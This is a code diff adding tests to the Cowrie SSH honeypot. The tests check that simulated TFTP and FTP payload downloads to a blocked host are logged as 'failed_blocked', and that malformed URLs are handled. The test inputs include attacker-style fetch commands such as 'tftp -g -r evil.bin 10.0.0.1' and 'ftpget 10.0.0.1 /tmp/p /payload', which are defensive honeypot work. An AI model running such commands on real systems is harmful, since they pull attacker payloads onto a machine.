@@ -10,7 +10,7 @@ Parser correctness and observation framing are the higher-value targets.
 
 from __future__ import annotations
 
-import unittest
+from twisted.trial import unittest
 
 from cowrie.llm.downloader import (
     DownloadIntent,
@@ -131,6 +131,57 @@ class TestObservationRendering(unittest.TestCase):
         rendered = render_observation(intent, result)
         self.assertIn("outcome: failed_blocked", rendered)
         self.assertIn("Connection refused", rendered)
+
+
+class TestFetchDispatch(unittest.TestCase):
+    """Smoke tests for the fetch() dispatcher and the blocked-by-policy
+    path for non-HTTP protocols. The success path requires real
+    TFTP/FTP servers and is exercised via the live attacker simulator,
+    not here.
+    """
+
+    def test_tftp_url_blocked_yields_failed_blocked(self):
+        from twisted.internet import defer as _defer
+        from cowrie.llm import downloader as dl
+        events: list[dict] = []
+        intent = dl.DownloadIntent(
+            tool="tftp", url="tftp://10.0.0.1/evil.bin",
+            outfile="evil.bin", raw_command="tftp -g -r evil.bin 10.0.0.1",
+        )
+        # Patch communication_allowed to return False for this host.
+        self.patch(dl, "communication_allowed",
+                   lambda host: _defer.succeed(False))
+        d = dl.fetch(intent, log_event=lambda **kw: events.append(kw))
+        result = self.successResultOf(d)
+        self.assertEqual(result.outcome, "failed_blocked")
+        self.assertEqual(events[0]["eventid"], "cowrie.session.file_download.failed")
+        self.assertEqual(events[0]["url"], "tftp://10.0.0.1/evil.bin")
+
+    def test_ftp_url_blocked_yields_failed_blocked(self):
+        from twisted.internet import defer as _defer
+        from cowrie.llm import downloader as dl
+        events: list[dict] = []
+        intent = dl.DownloadIntent(
+            tool="ftpget", url="ftp://10.0.0.1/payload",
+            outfile="/tmp/p", raw_command="ftpget 10.0.0.1 /tmp/p /payload",
+        )
+        self.patch(dl, "communication_allowed",
+                   lambda host: _defer.succeed(False))
+        d = dl.fetch(intent, log_event=lambda **kw: events.append(kw))
+        result = self.successResultOf(d)
+        self.assertEqual(result.outcome, "failed_blocked")
+
+    def test_malformed_tftp_url_yields_failed_connection(self):
+        from cowrie.llm import downloader as dl
+        events: list[dict] = []
+        intent = dl.DownloadIntent(
+            tool="tftp", url="tftp://", outfile=None,
+            raw_command="tftp",
+        )
+        d = dl.fetch(intent, log_event=lambda **kw: events.append(kw))
+        result = self.successResultOf(d)
+        self.assertEqual(result.outcome, "failed_connection")
+        self.assertIn("malformed", result.error_message.lower())
 
 
 class TestLeakStrip(unittest.TestCase):
